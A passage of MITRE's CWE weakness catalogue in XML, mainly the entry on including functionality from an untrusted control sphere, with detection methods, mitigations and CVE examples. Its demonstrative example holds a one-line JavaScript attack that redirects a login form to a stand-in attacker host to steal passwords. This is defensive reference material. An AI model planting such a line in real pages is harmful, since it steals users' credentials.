               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-12-10</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-07-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Applicable_Platforms</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Contribution Type="Content">
               <ns0:Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</ns0:Contribution_Name>
               <ns0:Contribution_Organization>CWE-CAPEC ICS/OT SIG</ns0:Contribution_Organization>
               <ns0:Contribution_Date>2023-04-25</ns0:Contribution_Date>
               <ns0:Contribution_Comment>Suggested mappings to ISA/IEC 62443.</ns0:Contribution_Comment>
            </ns0:Contribution>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="829" Name="Inclusion of Functionality from Untrusted Control Sphere" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <ns0:Description>The product imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>When including third-party functionality, such as a web widget, library, or other source of functionality, the product must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.</html:p>
            <html:p>This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).</html:p>
         </ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</ns0:Note>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
               <ns0:Note>An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Manual Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Forced Path Execution</html:li>
                           <html:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Manual Source Code Review (not inspections)</html:li>
                        </html:ul>
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Focused Manual Spotcheck - Focused manual analysis of source</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Source code Weakness Analyzer</html:li>
                           <html:li>Context-configured Source Code Weakness Analyzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Architecture or Design Review</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</html:li>
                           <html:li>Formal Methods / Correct-By-Construction</html:li>
                        </html:ul>
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Attack Modeling</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation Mitigation_ID="MIT-4">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Libraries or Frameworks</ns0:Strategy>
               <ns0:Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-21.1">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Enforcement by Conversion</ns0:Strategy>
               <ns0:Description>
                  <html:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</html:p>
                  <html:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-15">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-22">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Phase>Operation</ns0:Phase>
               <ns0:Strategy>Sandbox or Jail</ns0:Strategy>
               <ns0:Description>
                  <html:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</html:p>
                  <html:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</html:p>
                  <html:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</html:p>
                  <html:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>Limited</ns0:Effectiveness>
               <ns0:Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</ns0:Effectiveness_Notes>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-17">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Phase>Operation</ns0:Phase>
               <ns0:Strategy>Environment Hardening</ns0:Strategy>
               <ns0:Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-5.1">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Strategy>Input Validation</ns0:Strategy>
               <ns0:Description>
                  <html:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</html:p>
                  <html:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</html:p>
                  <html:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</html:p>
                  <html:p>When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</html:p>
                  <html:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-34">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Phase>Operation</ns0:Phase>
               <ns0:Strategy>Attack Surface Reduction</ns0:Strategy>
               <ns0:Description>
                  <html:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</html:p>
                  <html:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-6">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Strategy>Attack Surface Reduction</ns0:Strategy>
               <ns0:Description>
                  <html:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</html:p>
                  <html:p>Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-29">
               <ns0:Phase>Operation</ns0:Phase>
               <ns0:Strategy>Firewall</ns0:Strategy>
               <ns0:Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</ns0:Description>
               <ns0:Effectiveness>Moderate</ns0:Effectiveness>
               <ns0:Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</ns0:Effectiveness_Notes>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-94">
               <ns0:Intro_Text>This login webpage includes a weather widget from an external website:</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="HTML">
                  <html:div>&lt;div class="header"&gt; Welcome!<html:div style="margin-left:1em;">&lt;div id="loginBox"&gt;Please Login:<html:div style="margin-left:1em;">&lt;form id ="loginForm" name="loginForm" action="login.php" method="post"&gt;<html:br />Username: &lt;input type="text" name="username" /&gt;<html:br />&lt;br/&gt;<html:br />Password: &lt;input type="password" name="password" /&gt;<html:br />&lt;input type="submit" value="Login" /&gt;<html:br />&lt;/form&gt;</html:div>&lt;/div&gt;<html:br />&lt;div id="WeatherWidget"&gt;<html:div style="margin-left:1em;">&lt;script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"&gt;&lt;/script&gt;</html:div>&lt;/div&gt;</html:div>&lt;/div&gt;</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).</ns0:Body_Text>
               <ns0:Body_Text>For example, user login information could easily be stolen with a single line added to weatherwidget.js:</ns0:Body_Text>
               <ns0:Example_Code Nature="Attack" Language="JavaScript">
                  <html:div>
                     <html:br />
                     <html:i>...Weather widget code....</html:i>
                     <html:br />document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-2076</ns0:Reference>
               <ns0:Description>Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-2076</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0285</ns0:Reference>
               <ns0:Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0285</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0030</ns0:Reference>
               <ns0:Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0030</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0068</ns0:Reference>
               <ns0:Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0068</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2157</ns0:Reference>
               <ns0:Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2157</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2162</ns0:Reference>
               <ns0:Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2162</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2198</ns0:Reference>
               <ns0:Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2198</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0128</ns0:Reference>
               <ns0:Description>Modification of assumed-immutable variable in configuration script leads to file inclusion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0128</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1864</ns0:Reference>
               <ns0:Description>PHP file inclusion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1864</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1869</ns0:Reference>
               <ns0:Description>PHP file inclusion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1869</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1870</ns0:Reference>
               <ns0:Description>PHP file inclusion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1870</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2154</ns0:Reference>
               <ns0:Description>PHP local file inclusion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2154</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-1704</ns0:Reference>
               <ns0:Description>PHP remote file include.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-1704</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-1707</ns0:Reference>
               <ns0:Description>PHP remote file include.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-1707</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1964</ns0:Reference>
               <ns0:Description>PHP remote file include.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1964</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1681</ns0:Reference>
               <ns0:Description>PHP remote file include.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1681</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2086</ns0:Reference>
               <ns0:Description>PHP remote file include.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2086</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0127</ns0:Reference>
               <ns0:Description>Directory traversal vulnerability in PHP include statement.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0127</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1971</ns0:Reference>
               <ns0:Description>Directory traversal vulnerability in PHP include statement.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1971</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-3335</ns0:Reference>
               <ns0:Description>PHP file inclusion issue, both remote and local; local include uses ".." and "%00" characters as a manipulation, but many remote file inclusion issues probably have this vector.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-3335</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="175" />
            <ns0:Related_Attack_Pattern CAPEC_ID="201" />
            <ns0:Related_Attack_Pattern CAPEC_ID="228" />
            <ns0:Related_Attack_Pattern CAPEC_ID="251" />
            <ns0:Related_Attack_Pattern CAPEC_ID="252" />
            <ns0:Related_Attack_Pattern CAPEC_ID="253" />
            <ns0:Related_Attack_Pattern CAPEC_ID="263" />
            <ns0:Related_Attack_Pattern CAPEC_ID="538" />
            <ns0:Related_Attack_Pattern CAPEC_ID="549" />
            <ns0:Related_Attack_Pattern CAPEC_ID="640" />
            <ns0:Related_Attack_Pattern CAPEC_ID="660" />
            <ns0:Related_Attack_Pattern CAPEC_ID="695" />
            <ns0:Related_Attack_Pattern CAPEC_ID="698" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-45" />
            <ns0:Reference External_Reference_ID="REF-76" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CWE Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>MITRE</ns0:Submission_Organization>
               <ns0:Submission_Date>2010-11-29</ns0:Submission_Date>
               <ns0:Submission_Version>1.11</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2010-12-13</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Potential_Mitigations, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-10-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-19</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-03</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Modes_of_Introduction, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
